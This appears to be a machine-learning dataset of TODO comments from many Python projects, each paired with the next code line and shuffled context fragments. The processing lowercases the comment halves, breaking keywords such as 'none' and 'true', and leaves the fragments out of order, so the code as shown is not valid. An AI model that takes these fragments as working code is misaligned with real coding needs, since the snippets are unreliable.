# todo: 判断返回结果，处理异常 </s> print msg	perm_role_delete task = Tasks(recycle_resource) msg = task.del_user(get_object(PermRole, id=role_id).name) key_files = os.listdir(role_key) for key_file in key_files:
pass  # todo </s> parsed arguments.	wave_gen args : :class:`argparse.Namespace`
# todo pseudo code: </s> pass	PlayPause @dbus.service.method(dbus_interface=player_interface) def PlayPause(self):
except exception:  # todo - which exceptions? </s> pass  # skip unparsable tag	_parse_feature try: feature.qualifiers[feature_element.tag.replace(NS, '')] = feature_element.text self.ParsedSeqRecord.features.append(feature)
# todo: can only set before calling go() </s> def setcanedit(self, value=true):	setCanEdit self.canEdit = value
# todo add read lock </s> try:	discard_current_batch def discard_current_batch(self): self.storage_reader.discard_batch() finally:
raise exceptions.mpdnotimplemented  # todo </s> underscore, dash, dot and colon.	subscribe already. The name may consist of alphanumeric ASCII characters plus
# todo should we instead pick the best result, instead of just the first? </s> p_movie = p_movies[0]	run_watched if all([not x.seen for x in p_movies]): return True self.store('watched', self.get_trakt_data(key, p_movie))
#todo: rewrite this without get_block_data() </s> blocks = get_block_data(df)	_parse_index def _parse_index(self): with open(self.dataset.parameter_filename, 'rb') as df: header = self.dataset.parameters ndim = self.dataset.dimensionality
pass # todo: raise exception </s> else:	connect self.__signals[signal].append(function) else: pass # TODO: raise exception
# todo: returning httpresponse seems dirty. see if it can be </s> return httpresponse(	serve_preview if mode == 'success': fobi_form_processor = FobiFormProcessor() fobi_form_processor.show_thanks_page(request, self) )
# todo: remove this </s> return equipmenttype.query.filter_by(name=name).first()	get_equipment_by_name def get_equipment_by_name(self, name):
# todo instead of 3*t, use log_sf </s> dur += sample_discrete(dur_distn.pmf(np.arange(dur+1,3*self.t)))	HSMMStatesPython else: if self.censoring: else: dur += 1
if util.pythonise(pipe['wires'][wire]['tgt']['moduleid']) == module_id and pipe['wires'][wire]['tgt']['id'] == '_input' and pipe['wires'][wire]['src']['id'].startswith('_output'): # todo? this equates the outputs </s> input_module = util.pythonise(pipe['wires'][wire]['src']['moduleid'])	write_pipe input_module = "forever" for wire in pipe['wires']: if module_id in pipe['embed']: assert input_module == "forever", "input_module of an embedded module was already set"
1  # todo: fill in identifier </s> )	test_netting second_direct_transfer0 = channel0.create_directtransfer( second_transfer_amount0, second_direct_transfer0.sign(privatekey0, address0) second_direct_transfer0_data = str(second_direct_transfer0.packed().data)
1  # todo: fill in identifier </s> )	test_settlement_with_unauthorized_token_transfer direct_transfer1 = channel1.create_directtransfer( transfer_amount1, direct_transfer1.sign(privatekey1, address1) nettingchannel.close(
# todo: ensure the same callback logic as in set_settled </s> if self._opened_block != 0:	set_opened def set_opened(self, block_number): raise RuntimeError('channel is already open') self._opened_block = block_number
# todo(tlashchova): remove this method when mistralclient>1.0.0 is used. </s> return six.text_type(self._get_ec2_signed_url())	_resolve_attribute elif name == self.ALARM_URL:
# todo: how do we know something has changed? </s> self.git_add([self._cfg_file, self._md_file])	__init__ importer.set_graphs(graphs)  # necessary? importer.store_data(opj(self.path, self.datalad_path)) self.git_commit("Initialized config file.")
# todo: parse the field contents </s> self.xe_fields.append(xe)	__call__ xe = parse_xe(field.instructions[0][1], log)  # TODO: Handle field with multiple instructions if xe:
# todo fix the fold to allow any number of dispositions </s> return (	new_admissions_chart else: x_kwargs = {"shorthand": "day", "title": "Days from today"} alt.Chart(projection_admits.head(plot_projection_days)) .transform_fold(fold=["hospitalized", "icu", "ventilated"])
# todo error handling. </s> output = subprocess.check_output("git ls-files --unmerged".split())	get_unmerged_files def get_unmerged_files(self): output_array = [line.split() for line in output.splitlines()] if len(output_array) % 3 != 0:  # TODO should be something else
assert study_id == in_memory_storage_study_id  # todo(akiba) </s> with self._lock:	create_new_trial_id def create_new_trial_id(self, study_id): trial_id = len(self.trials) self.trials.append(trial.Trial(trial_id))
# todo support domain delegation, which will allow us to set a sub-account to execute as. we can then </s> http = httplib2.http()	get_conn key, scope=BQ_SCOPE) http_authorized = credentials.authorize(http) service = build('bigquery', 'v2', http=http_authorized)
# todo: implement this method </s> return self._repeat	Timer @property def repeat(self): @repeat.setter def repeat(self, timeout):
# todo check if for each column, all rows have equal-index series </s> if self.check_input:	transform Tabular dataframe with only primitives in cells. check_is_fitted(self, 'is_fitted_') X = check_ts_array(X) Xt = tabularize(X)
# todo(b/138406006): remove the narrower dependency for pyarrow </s> 'numpy>=1.16,<1.17',	make_extra_packages_docker_image 'python-snappy>=0.5,<0.6', 'tensorflow>=1.14,<2', 'pyarrow>=0.14,<0.15',
content=content,  # todo(tsileo): handle markdown </s> tag=tags,	new cc=cc, to=[to if to else config.AS_PUBLIC], source={'mediaType': 'text/markdown', 'content': source}, inReplyTo=reply.id,  # FIXME(tsieo): support None for inReplyTo?
# todo: we should probably have a special folder just for header </s> import brian2.synapses as synapses	__init__ self.include_dirs = list(prefs['codegen.cpp.include_dirs']) self.include_dirs += [os.path.join(sys.prefix, 'include')] synapses_dir = os.path.dirname(synapses.__file__) self.include_dirs.append(synapses_dir)
# todo: does it get closed properly after process gets killed? </s> self._sftp = paramiko.sftpclient.from_transport(self._client.get_transport())	_get_sftp if self._sftp is None: import paramiko return self._sftp
# todo: try /usr/bin/curl instead? </s> try:	inspect_download_url except HTTPError as err: if err.code == 403: raw_download = useragent_urlopen(checked_url, "Mozilla/5.0") facts["user-agent"] = "Mozilla/5.0"
"""todo: document and test""" </s> return sum([hg.degree(edge) for edge in edges])	sum_degree def sum_degree(self, edges):
# todo make this smarter about more complex configurations (backup original values, etc) </s> obj_doc['dps'][switch_found]['timeout'] = self.reinvestigation_frequency	config if ok: if action == 'mirror': obj_doc['dps'][switch_found]['arp_neighbor_timeout'] = self.reinvestigation_frequency if not port in obj_doc['dps'][switch_found]['interfaces'][self.mirror_ports[switch_found]]['mirror'] and port is not None:
# todo: determine proper template to use. </s> app_name + "." + recipe_format + ".recipe"] = "template tbd"	handle_absolute_recipe_input if app_name + "." + recipe_format + ".recipe" not in __existing_recipes__: __buildable_recipes__[
# todo: need a more specific colour here; conflict is wrong </s> rgba0 = self.fill_colors['conflict'].copy()	replace_chunk mark1 = b1.create_mark(None, new_end, True) if chunk[1] == chunk[2]: rgba1 = self.fill_colors['conflict'].copy() else:
# todo(b/123952794): migrate to v2 function. </s> dataset = dataset.map_with_legacy_function(	_as_dataset shuffle_files=shuffle_files, ) self.info.features.decode_example, num_parallel_calls=tf.data.experimental.AUTOTUNE)
# todo: filter according to what names the current file has in scope. </s> completions = []	get_completions def get_completions(self, current_file_name): "Get all the completions that apply to the current file." with self.info_lock: for file_name, file_info in self.info.items():
#add to favorites tag --> todo translated label for favorites ? </s> if userdata.get("favorite"):	addOrUpdateMovieToKodiLibrary self.AddStudiosToMedia(movieid, studios, "movie", cursor) self.AddStreamDetailsToMedia(API().getMediaStreams(MBitem), fileid, cursor) self.AddTagToMedia(movieid, "Favorite movies", "movie", cursor) else:
# todo(kan-bayashi): need to make more smart way </s> ys = [y[y != self.ignore_id] for y in ys_pad]  # parse padded ys	CTC :param ys: :return: self.loss = None ilens = torch.from_numpy(np.fromiter(ilens, dtype=np.int32))
# todo: write this in human </s> paths = ['/'.join(['..']*(len(crumbs)-2-i)) for i in range(len(crumbs[:-2]))] + ['.', '#']	render_listing title = os.path.basename(in_name) crumbs = out_name.split(os.sep)[1:-1] + [title] context = { 'code': code,
# todo: automate this (by lookup from nn). </s> internal_states_space=impalaagent.standard_internal_states_space,	test_impala_actor_plus_learner_agent_functionality_actor_part state_space=env.state_space, action_space=env.action_space, execution_spec=dict( mode="distributed",
# todo(dcramer): once this goes live in production, we can kill the pickle path </s> pipe.hset(key, 'e+' + column, pickle.dumps(value))	incr if extra: for column, value in six.iteritems(extra): pipe.expire(key, self.key_expire) pipe.zadd(pending_key, time(), key)
# todo: log exception </s> pass	parse_config section_dict[key] = ast.literal_eval(section_dict[key]) except Exception as e: return_var[section] = section_dict return return_var
# todo !!! </s> primary_key = expression.columnset()	_compile_pks self._get_clause = self.inherits._get_clause else: for col in (self.primary_key_argument or self._pks_by_table[self.mapped_table]): c = self.mapped_table.corresponding_column(col)
# todo: handle base64 data another way? </s> return compare_strings_approximate(x, y)	compare_base64_approximate if len(x) != len(y): return False
# todo(vek): need to pass context in for access to auth_token </s> raise notimplementederror()	get_console_output def get_console_output(self, instance):
# todo: better parallel sort test </s> def test_impl():	test_sort_parallel def test_sort_parallel(self): df = pq.read_table('kde.parquet').to_pandas() df['A'] = df.points.astype(np.float64)
#todo: remove expressions </s> firstnote.duration.quarterlength = self.quarterlength	Trill for i in range(numberOfTrillNotes): firstNote = copy.deepcopy(srcObject) secondNote = copy.deepcopy(srcObject) secondNote.duration.quarterLength = self.quarterLength
# todo: simple_test_builtin should this as status=2. </s> return false	Eval mode = posix.lstat(s).st_mode except OSError: return stat.S_ISLNK(mode) try:
# todo merge sort on large dataset!!! </s> rows = list(it)	itersort flds = it.next() yield flds if key is not None: indices = asindices(flds, key)
# todo: strs->index() has a redundant check for (i < 0) </s> s = array_val.strs[index]	GetArrayItem index += last_nonempty_index + 1 if 0 <= index and index < n: else: s = None
# todo(ntonci): add a check for small motion </s> j = i+1	align screw_axis_W_E_i, rotation_W_E_i, translation_W_E_i = dq_W_E_i.screw_axis(); screw_axis_B_H_i, rotation_B_H_i, translation_B_H_i = dq_B_H_i.screw_axis(); while j < len(dq_W_E_vec_filtered): dq_W_E_j = dq_W_E_vec_filtered[j]
# todo: this is highly inefficient if more properties are accessed; </s> if self._lgd is none:	lgd @property def lgd(self): if self._stft is not None and self._phase is None: self._phase = np.angle(self._stft)
# todo: fix self.cursor_x >= w </s> line = self.win_y + self.cursor_y	main_cmd_next_bracket def main_cmd_next_bracket(self, h, w): x = self.cursor_x char = self.output.lines[line][x]
# todo: log exception </s> return none	scan output = sshexec(host, list2cmdline(cmdline), port=port, username=user, key_filename=conf["key"]) except Exception as e: output = output.decode("utf-8", errors='replace') virusresults = re.findall("(?:\([^\)]*\) )?([^\s]+) (.+)\s+$", output, re.MULTILINE)
# xxx todo </s> return address, size	input_address_range size    = None
# * todo heading 1 --> </s> vim.current.window.cursor = (2, 0)	test_circle_through_todo_states def test_circle_through_todo_states(self): Todo.toggle_todo_state() self.assertEqual(vim.current.buffer[1], '* TODO Heading 1')
# todo, i would prefer to query if the language was found... </s> except:	load_models_using_filepattern try: the_metamodel = metamodel_for_file(filename) if the_metamodel is None:  # no metamodel defined... raise
# todo: remove </s> import pdb; pdb.set_trace()	error_handler if self.debug_error:
# todo: kwargs </s> def _impl(df, periods=1, fill_method='pad', limit=none, freq=none):	pct_change_overload @overload_method(DataFrameType, 'pct_change') def pct_change_overload(df, periods=1, fill_method='pad', limit=None, freq=None): return hpat.hiframes.pd_dataframe_ext.pct_change_dummy(df, periods) return _impl
# todo check the dataset </s> _, response_data = run_on_dataset(	post_request try: dataset = Dataset("request", request_data, {}) args.tf_manager, args.runners, dataset, args.postprocess, write_out=False)
# todo pass zk node version to make sure we still own this node </s> self._zookeeper.delete(self._path_from_partition(p))	_remove_partitions :type partitions: Iterable of :class:`pykafka.partition.Partition` for p in partitions:
# todo: replace this with a simpler environment where we can actually test if it finds a solution </s> env = gym.make('pendulum-v0')	test_cdqn def test_cdqn(): np.random.seed(123) env.seed(123)
# todo tests for this </s> return the target final release for a pre-release.	target_release def target_release(version): :param bytes version: A pre-release version of Flocker. :return bytes: The final marketing version the pre-release is for.
# todo: see collections </s> pass	__delitem__ def __delitem__(self, key):
# todo: tf2.0 not stable, cannot import tensorflow.contrib.eager.python.saver </s> pass	save_ckpt saver.save(sess, ckpt_file, global_step=global_step) else:
# todo: add for morph targets data. </s> return result_primitive	extract_primitive_floor attributes[joint_id].append(source_attributes[joint_id][old_index * 4 + vi]) attributes[weight_id].append(source_attributes[weight_id][old_index * 4 + vi])
# todo(karita) use torch.no_grad here </s> if not torch_is_old:	evaluate def evaluate(model, iter, bproplen=100): torch.set_grad_enabled(False) model.predictor.eval()
# todo: bytes vs str </s> pairs = s.decode().split("&")	parse_qs def parse_qs(s): res = {} for p in pairs: k, v = p.split("=", 1)
# todo: remove this older form of error handling. </s> if not node:	OilCommandMain return 2 else: err = c_parser.Error() assert err, err  # can't be empty
# todo remove </s> args = parsing.array(parsing.array.tuple, none, values=[])	handle_iterators else: try: generators += \ it.execute_subscope_by_name('__iter__', args)
# todo: explicitly commit files by name </s> youngest_ancestor = os.path.commonprefix(files)	add if exitcode != 0: raise IOError("[Mercurial] Error running '%s': %s" % (command, error)) return output + type(self)(youngest_ancestor).commit(message, author)
# todo(hartikainen): once tfp.bijectors.chain supports conditioning, </s> fldj = tf.cast(0., dtype=x.dtype.base_dtype)	_forward_log_det_jacobian self._maybe_assert_valid_x(x) conditions = self._get_flow_conditions(**condition_kwargs) event_ndims = self._maybe_get_static_event_ndims( self.forward_min_event_ndims)
# todo: disconnect </s> return	Node except asyncio.TimeoutError: await stream.reset() self.logger.debug(f"Received the hello message {hello_other_side}") if not (await self._validate_hello_req(hello_other_side)):
# todo: check whether the name is already used or not </s> tex = bpy.data.textures.new(name, type='clouds')	add_clouds_texture https://docs.blender.org/api/current/bpy.types.Texture.html https://docs.blender.org/api/current/bpy.types.CloudsTexture.html tex.noise_scale = size tex.noise_depth = depth
# todo(tr3buchet): fix function call after refactor </s> resp = self._make_plugin_call('agent', 'resetnetwork', instance, '',	reset_network def reset_network(self, instance, vm_ref): args = {'id': str(uuid.uuid4())} args, vm_ref)
# todo: make sure requesting user is owner of the build_id </s> last_release = release.query.filter_by(	create_release build_id = request.form.get('build_id', type=int) assert build_id, 'build_id required' build_id=build_id, name=name,
# todo: if build and the following command fails "podman inspect -t image <image_name>" then run build </s> if no_cleanup == false:	up def up(project_name, dirname, pods, containers, no_cleanup, dry_run, podman_path): os.chdir(dirname) down(project_name, dirname, pods, containers, dry_run, podman_path) for pod in pods:
# todo sp: updatable attributes ? </s> raise modificationnotallowed(	_set_attr self._attrs_cache[key] = copy.deepcopy(value) else: "Cannot set an attribute after saving a node")
# todo imageio single frame seek seems slow. look into this </s> else:	check_input_folder logger.verbose("Video exists at: '%s'", self.folder) retval = cv2.VideoCapture(self.folder)  # pylint: disable=no-member logger.verbose("Folder exists at '%s'", self.folder) retval = None
# todo: move to config check </s> csv_import_file = model.csv_import_path + '/' + model.csv_import_filename	system csv_import_username = model.csv_import_username info_logger(csv_import_username.username, " SYSTEM_IMPORTER_FILE_CSV_CRON_BEGAN") if not os.path.isdir(model.csv_import_path): error_logger(csv_import_username.username, " SYSTEM_IMPORTER_FILE_CSV_CRON_PATH_NOT_EXISTING")
# todo: boto3 call can fail with botocore.exceptions.clienterror, </s> response = self.r53client.change_resource_record_sets(	create_elb_dns for zone_id in zone_ids: self.log.debug('zone_id: %s', zone_id) HostedZoneId=zone_id, ChangeBatch=json.loads(dns_json), )
# todo: move this to either settings.py or the sql configuration. </s> entries_per_page = 15	news_archive Shows an archive of news entries. news_entries = NewsEntry.objects.all().order_by('-date_posted') pagevars = { "page_title": "News Archive",
#todo eval hook </s> return f	__mcqa_reader __reader(f) mcqa_readers.setdefault(f.__name__, f)
data_source_name='ledger-v2',  # todo: this isn't really needed. </s> domain=domain,	_change_meta_from_ledger_reference document_id=ledger_reference.as_id(), data_source_type=data_sources.LEDGER_V2, is_deletion=False,
# todo only do these thing if status is true </s> else:	process status = Actions( endpoint, self.s.sdnc).mirror_endpoint() endpoint.p_next_state = 'mirror' endpoint.queue()
# todo -- parallelize this </s> for current_file in getattr(protocol, subset)():	validate_epoch log_scale=model.logsoftmax) metric = DiarizationPurityCoverageFMeasure() reference = current_file['annotation'] uri = get_unique_identifier(current_file)
# todo: remove this. </s> labeled_nodes_train, labeled_nodes_val = self._select_val_set_v2(	TrainerAgreement labeled_samples_labels = data.get_labels(labeled_samples) ratio_pos_to_neg = self._compute_ratio_pos_neg(labeled_samples_labels) labeled_samples, self.ratio_val) data_iterator_train = self._pair_iterator_v2(labeled_nodes_train, data,
# todo: why the reverse order? </s> rotatef(rotz, 0, 0, 1)	rotate def rotate(rotx, roty, rotz): rotatef(roty, 0, 1, 0) rotatef(rotx, 1, 0, 0)
# todo: migrate new article ids to articlecontents </s> super(migration, self).move_self_foreignkeys(orm)	move_self_foreignkeys def move_self_foreignkeys(self, orm):
# todo: this size isn't calculating correctly currently, but it should be included in the json </s> jsn["type"] = transactiontype.toname(self.type)	ToJson jsn = {} jsn["txid"] = self.Hash.To0xString() jsn["version"] = self.Version jsn["attributes"] = [attr.ToJson() for attr in self.Attributes]
# todo(b/131315065): remove the comment above when the csv decoder no longer </s> def process(self, batch: list[any]) -> iterable[pa.table]:	_BatchedExamplesToArrowTablesDoFn class _BatchedExamplesToArrowTablesDoFn(beam.DoFn): yield decoded_examples_to_arrow.DecodedExamplesToTable(batch)
# todo: retry instead? </s> @celery_app.task(name=eventscelerytasks.events_handle_logs_build_job)	events_handle_logs_build_job def events_handle_logs_build_job(job_uuid, job_name, log_line): if not BuildJob.objects.filter(uuid=job_uuid).exists():
# todo: add support of tuple (row_offset, col_offset) </s> scale_size = rows + offset, cols + offset	ms_image_augment augmented_inputs = [] for offset in size_offsets: scaled_input = torch.nn.functional.interpolate(image, size=scale_size, mode=mode, align_corners=align_corners) augmented_inputs.append(scaled_input)
# todo: model only from our models </s> available_models = {**models.__dict__}	ef_main ) print("Creating model") model = available_models[args.model](pretraining=args.pretrained) model.to(device)
# todo: axis should support 1 or 'columns' either at this moment </s> return dataframe(internal)	diff internal = self._internal.copy(sdf=sdf, data_columns=[c.name for c in applied])
# todo optimize </s> in: see below	CalcFiniteHorizonOptimalInputWithOpt u""" Calc Finite Horizon Optimal Input min x'Px+sum(x'Qx+u'Ru) s.t xk+1=Axk+Bu
eprint('❗ ' + x) # todo yellow? </s> def warning(x: str):	warning
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_fail_min_weight_magnitude_string def test_fail_min_weight_magnitude_string(self): ``min_weight_magnitude`` is a string.
data = json.load(open(input_fn))  # todo do we support multiple arguments here? </s> y = numpy.array(data['y'])	stack_plot def stack_plot(input_fn, display=False, outfile='stack_plot.png', max_n=20, normalize=False, dont_stack=False): if y.shape[0] > max_n: js = sorted(range(len(data['labels'])), key=lambda j: max(y[j]), reverse=True)
# todo: serialize the policy </s> return response('policy created!', status=200)	create_policy new_policy = drone_alice.create_policy(bob, label, m, n, federated=federated_only)
# todo save the error to the plugin </s> plugin_db_setting.save()	_init_plugins if not settings.PLUGIN_TESTING: plugin_db_setting.active = False settings.INTEGRATION_PLUGINS_INACTIVE[plug_key] = plugin_db_setting continue  # continue -> the plugin is not loaded
#todo: check if/where this is used; if not used externally - remove </s> return self.marker_detector.marker_min_confidence	Surface_Tracker @property def marker_min_confidence(self) -> float: @marker_min_confidence.setter def marker_min_confidence(self, value: float):
# todo - find a workaround for this </s> import time	test_process_name def test_process_name(self): proc = subprocess.Popen(sys.executable) time.sleep(0.5) try:
# todo find out if this is good because of sparcity... </s> 'prefers_data_normalized': false,	get_meta_information 'handles_numerical_features': True, 'prefers_data_scaled': False, 'handles_multiclass': True, 'handles_multilabel': True,
#todo: check the data! </s> self.asserttrue(count > 0)	test_fetchpage for i in p: count += 1
# todo: remove the append lock once append like ops are thread safe </s> with self._append_lock:	task def task(): tid = threading.get_ident() self.started.append(tid) try:
# todo: skipped due to gh-4436 </s> yield skip_if_on_windows(skip_ssh(_test_bare_git_version_1)), 'datalad-test'	test_bare_git_version_1 def test_bare_git_version_1(): yield _test_bare_git_version_1, None
# todo: non-numeric columns should be ignored automatically </s> def test_impl(n):	test_mean1 def test_mean1(self): df = pd.DataFrame({'A': np.arange(n)+1.0, 'B': np.arange(n)+1}) return df.mean()
# todo error on missing levels </s> pass	determine_attributes dashes = dict(zip(style_levels, self.default_dashes)) elif isinstance(dashes, dict): else: dashes = dict(zip(style_levels, dashes))
## todo: # fixme: remove me </s> if not paste_childrens:	get_all_pastes_domain paste_parent = father.replace(self.paste_directory, '')[1:] paste_childrens = self.r_serv_metadata.smembers('paste_children:{}'.format(paste_parent)) paste_childrens = self.r_serv_metadata.smembers('paste_children:{}'.format(father)) for children in paste_childrens:
# todo(user): remove after 184 is out. </s> return cls(state["filename"], none)	FileOutputWriterBase if "request_filename" in state: return cls(state["filename"], state["request_filename"]) def to_json(self): Returns:
# todo: fix this </s> return cls()	from_json_content @classmethod def from_json_content(cls, value) -> 'FeatureConnector':
# todo: reactivate after fixing alternative selection </s> def test_artifact_exporter_spreadsheet_csv_config_artifactlist_artifact_id_form_label(self):	ArtifactExporterSpreadsheetCsvConfigFormTestCase class ArtifactExporterSpreadsheetCsvConfigFormTestCase(TestCase):
#todo generate the labels for the dict automatically from labels </s> data = {'time': time_array, 'data': countrate, 'labels': labels}	parse_obssumm_file dim = np.array(countrate[:,0]).size time_array = [reference_time_ut + timedelta(0,time_interval_sec * a) for a in np.arange(dim)] return header, data
# todo: must be implemented </s> pass	get_range_selection def get_range_selection(self, chapter_count, volume_count):
# todo manage tangent? </s> quat_keyframe = conversion.quaternion_gltf_to_blender(values[idx * 3 + 1])	parse_rotation_channel for idx, key in enumerate(keys): if animation.samplers[channel.sampler].interpolation == "CUBICSPLINE": else: quat_keyframe = Conversion.quaternion_gltf_to_blender(values[idx])
# todo: find 1 or 2 utxo's with exact amount +/- self.network.dust_amount </s> one_utxo = utxo_query.\	_select_inputs if not utxo_query: return [] filter(DbTransactionOutput.spent.op("IS")(False), DbTransactionOutput.value >= amount, DbTransactionOutput.value <= amount + variance).first()
if norm_groups[i] == -1:  # todo: early break </s> skip = true	step grads_groups_flat.append(_flatten_dense_tensors(grads_to_use)) norm_groups.append(self._compute_grad_norm(grads_groups_flat[i])) if skip: self._update_scale(skip)
# todo generator </s> handle_dirty_dataset(ds, mode=if_dirty)	__call__ for ds_path in content_by_ds: ds = Dataset(ds_path) content = [ap['path'] for ap in content_by_ds[ds_path] if ap.get('type', None) != 'dataset' or ap['path'] == ds.path]
# todo: this is horrible </s> if len(setting) == 0 or setting[0] == '#':	load_floorc fd.close() for setting in default_settings: continue try:
# todo(b/155997704) clean this up once tfx_bsl makes a release. </s> if getattr(csv_decoder, 'parse_csv_line_yields_raw_records', false):	_CsvToExample file_pattern=csv_pattern, skip_header_lines=1) | 'ParseCSVLine' >> beam.ParDo(csv_decoder.ParseCSVLine(delimiter=','))) parsed_csv_lines |= 'ExtractParsedCSVLines' >> beam.Keys() column_infos = beam.pvalue.AsSingleton(
# todo: this doesn't seem necessary; test passes without it </s> time.sleep(1)	test_watch_dir watcher.watch(tmpdir) assert watcher.is_changed(tmpdir) is False filepath = os.path.join(tmpdir, 'foo') with open(filepath, 'w') as f:
# todo what is the performance of this like? </s> extended = cls.get_parser().parse(file_name)	get_episode_identifier return None, [] file_name = os.path.splitext(os.path.basename(parts[0].get('file')))[0] identifier = cls.get_chain_identifier(extended.chains[0].info) if extended.chains else None season = try_convert(video.get('parentIndex'), int)
# todo add test for this </s> if order >= 3:	Affine return_matrices=True) for heatmaps_i, arr_aug, matrix, order in zip(heatmaps, arrs_aug, matrices, order_samples): arr_aug = np.clip(arr_aug, 0.0, 1.0, out=arr_aug) heatmaps_i.arr_0to1 = arr_aug
# todo: support multiple. </s> device_id=device_id)	get_all_podcast_episodes include_deleted=include_deleted, updated_after=updated_after,
# todo: don't assume that content is octetstring </s> g.signed_data = signed['encap_content_info']['content']	decorator verifier.verify()  # Raises a SigningError if not valid g.signers.append(certificate) return f(*args, **kwargs)
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_pass_happy_path def test_pass_happy_path(self): Request is valid.
# todo: replace this with future on-the-fly-api-components. </s> return policy_sync_op	set_weights else:
# todo: should be threaded </s> script = "nmap --script ssl-enum-ciphers -p {} {}".format(str(port), self.host)	scan_ciphers def scan_ciphers(self, port=443): process = Popen(script.split(), stdout=PIPE, stderr=PIPE) result, err = process.communicate()
#exclude watched items --> currently hardcoded --> todo: add a setting for this ? </s> rule2 = subelement(root, "rule", {"field":"playcount","operator":"is"})	addVideoNodesForTag SubElement(root, "order", {"direction":"descending"}).text = "dateadded" SubElement(root, "limit").text = "25" SubElement(Rule2, "value").text = "0" try:
# todo: calculate mu-sigma for f1, accuracy, and roc_auc and make it selectable </s> cv_results['judgment_metric'] = np.mean(cv_results['mu_sigmas'])	atm_cross_val_large_multiclass rank_accuracies=rank_accuracies, mu_sigmas=mu_sigmas) cv_results['judgment_metric_std'] = np.std(cv_results['mu_sigmas']) return cv_results
# todo: should this be a glomerror of some form? probably </s> raise typeerror('failed to iterate on instance of type %r at %r (got %r)'	target_iter iterator = iterate(target) except Exception as e: % (target.__class__.__name__, Path(*scope[Path]), e)) return iterator
# truffle todo(ls): revert this loop to "yield from" </s> for __x in self.__cause__.format(chain=chain): yield __x	format if chain: if self.__cause__ is not None: yield _cause_message elif (self.__context__ is not None and
assert study_id == 0  # todo(akiba) </s> self.trials[trial_id].value = value	set_trial_value def set_trial_value(self, study_id, trial_id, value):
# todo: log exception </s> pass	scan continue except Exception as e: try: if row[0] not in conf['remove-entry']:
raise notimplementederror # todo </s> def search(self, conditions):	search
# todo: import that elsewhere </s> from . import _control	shareConstant def shareConstant(**kwargs): _control.execQueue.socket.pumpInfoSocket() for key, value in kwargs.items():
# todo: check how those names are constructed and may be at least count the number of created object files in addition to that comparison </s> eq_(set([f for f in all_files if not f.startswith('./.datalad/metadata/objects/')]), target_files)	test_openfmri_pipeline1 '.datalad/crawl/versions/incoming.json' } assert_not_in('ds666-beh_R1.0.1.tar.gz', repo.get_files(commits_l['incoming'][-1])) assert_in('ds666-beh_R1.0.1.tar.gz', repo.get_files(commits_l['incoming'][0]))
# todo: test this block </s> app_label, model_name = model_name.split(".", 1)	get_seo_models for model_name in getattr(settings, setting_name_seo_models, ()): if "." in model_name: model = models.get_model(app_label, model_name) if model:
# todo: implement logic for computing the host alias </s> playbook_host = self.client.post("/api/v1/hosts", name=host, alias=host, playbook=self.playbook["id"])	_get_or_create_host playbook_host = self._get_one_item("/api/v1/hosts", **query) if not playbook_host: return playbook_host
# todo: handle other resolve strategies </s> pass	read container_stacks[0].deserialize(archive.open(container_stack_file).read().decode("utf-8")) else: else: stack = ContainerStack(container_id)
# todo: configurable timeout??? </s> syndic_dict['dead_until'] = time.time() + 60	_forward_events except SaltClientError: log.error('Unable to return to {0}, trying another...'.format(master)) continue self._reset_event_aggregation()
# todo(piyush): current api-site doesn't contain this api description. </s> uri = '/agents/%s/dhcp-networks' % agent_id	add_dhcp_agent_to_network def add_dhcp_agent_to_network(self, agent_id, **kwargs): return self.create_resource(uri, kwargs)
# todo(kevinbenton): remove after bug/1666493 is resolved </s> if subnet['id'] != ipam_subnet.subnet_manager.neutron_id:	add_auto_addrs_on_network_ports def add_auto_addrs_on_network_ports(self, context, subnet, ipam_subnet): raise RuntimeError( "Subnet manager doesn't match subnet. %s != %s"
# todo(patrick, suraj, anton) - it's surprising that "non-padded/non-numpified" padding </s> for max_length, padding, var_tol in zip(max_lengths, paddings, var_tolerances):	test_cepstral_mean_and_variance_normalization_np max_lengths = [None, 16, None] var_tolerances = [1e-3, 1e-3, 5e-1] inputs = feature_extractor( speech_inputs, max_length=max_length, padding=padding, return_tensors="np", return_attention_mask=True
# todo: remove these deprecated properties we are off es 1 </s> "merge.policy.merge_factor": 20,	get_standard_es_settings "refresh_interval": "1800s", "max_result_window": SIZE_LIMIT, "store.throttle.max_bytes_per_sec": "1mb", "store.throttle.type": "merge",
n = 100 # todo: iir: more intelligent algorithm needed </s> else:	calc_n_points if N_user == 0: # set number of data points automatically if IIR: N = min(len(self.bb),  100) # FIR: N = number of coefficients (max. 100) else:
#todo: get darknet class number from class file </s> num_classes_darknet = 80	custom_tiny_yolo_body pre-trained weights from darknet and fit for our target classes.''' weights_path='model_data/tiny_yolo_weights.h5' base_model = tiny_yolo_body(inputs, num_anchors, num_classes_darknet)
# todo(ihrachys): replace with network.create() once we get an object </s> network = db_api.create_object(self.context, models_v2.network,	test_attach_port_get_port_policy obj = policy.QosPolicy(self.context, **self.db_obj) obj.create() {'name': 'test-network1'}) port = db_api.create_object(self.context, models_v2.Port,
# todo: aio core is separate from transport </s> if opts['transport'] in ('zeromq', 'tcp'):	get_master_event def get_master_event(opts, sock_dir, listen=True): Return an event object suitable for the named transport return MasterEvent(sock_dir) elif opts['transport'] == 'raet':
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_fail_unexpected_parameters def test_fail_unexpected_parameters(self):
st = manager.get_stat(path)  # todo: errors </s> if st.st_mtime != meta.mtime or st.st_size != meta.size:	is_meta_fresh if meta is None: return False manager.log('Metadata abandoned for {}: file {} is modified'.format(id, path)) return None
# todo: maybe this should be under a lock? </s> if len(cls.__strong_cache) > cls.__strong_cache_size:	__call__ cls.instance(s, posix_offset)) cls.__strong_cache[key] = cls.__strong_cache.pop(key, instance) cls.__strong_cache.popitem(last=False) return instance
logfile = open('logs/exceptions.log', 'a') #todo: make not hardcoded </s> logfile.write('fatal error in core, handle_error() was called')	handle_error pass self.debug("[core]", 'Fatal error in core, please review exception log', 'always') logfile.write(trace) logfile.write('----------------------------------------\n\n')
# todo the actual brodcast </s> return web.response()	ValidatorAPIHandler "broadcasting block with root %s", humanize_hash(block.hash_tree_root) ) @get(APIEndpoint.attestation) async def _get_attestation(self, request: web.Request) -> web.Response:
# todo: remove when transition to python3 complete </s> return frd(self.fresp/other.fresp, self.omega)	__truediv__ "FRD.__truediv__ is currently implemented only for SISO systems.")
# todo(laigd): remove this check when 312743821 is in the release. </s> if use_tf_function and tf.compat.v1.__version__ < '2.3.0':	CallDefunTest ) def testSimple(self, use_tf_function): return FLAGS.call_defun_use_tf_function = use_tf_function
